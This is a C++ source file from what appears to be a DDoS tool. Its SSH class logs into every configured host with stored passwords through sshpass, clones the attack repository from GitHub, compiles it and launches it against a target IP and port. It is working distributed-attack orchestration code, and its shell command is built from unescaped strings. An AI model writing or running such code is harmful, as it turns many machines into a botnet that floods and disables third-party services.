//
// Created by mao on 17-12-20.
//

#include <iostream>
#include "SSH.h"

SSH::SSH(arg_bundle args, const std::string &command) : DDosLibrary(args), command(command) {
}

void SSH::run() {
    srand(static_cast<unsigned int>(time(nullptr)));

    if (this->args.target_ip == nullptr) {
        return;
    }

    for (const ConfigLibrary::Host &host:ConfigLibrary::hosts) {
        std::cout << "Trying connect to host " << host.getHost() << std::endl;
        std::thread t(&SSH::connect, this, host);
        threads.push_back(std::move(t));
    }

    for (int j = 0; j < threads.size(); ++j) {
        threads.at(static_cast<unsigned long>(j)).join();
    }
}

void SSH::connect(const ConfigLibrary::Host &host) {
    utils::exec("sshpass -p '" + host.getPassword() + "' ssh " + host.getUserName() + "@" + host.getHost() +
                " '(rm -rf DDOS/&&git clone https://github.com/amaoamao/DDOS.git&&cd DDOS&&g++ *.cpp -std=c++11 -lpthread -o ddos&&./ddos -sh \"" +
                this->command + " " + this->args.target_ip + " " + std::to_string(this->args.target_port) + " " +
                std::to_string(this->args.thread_num) + "\")'");
}
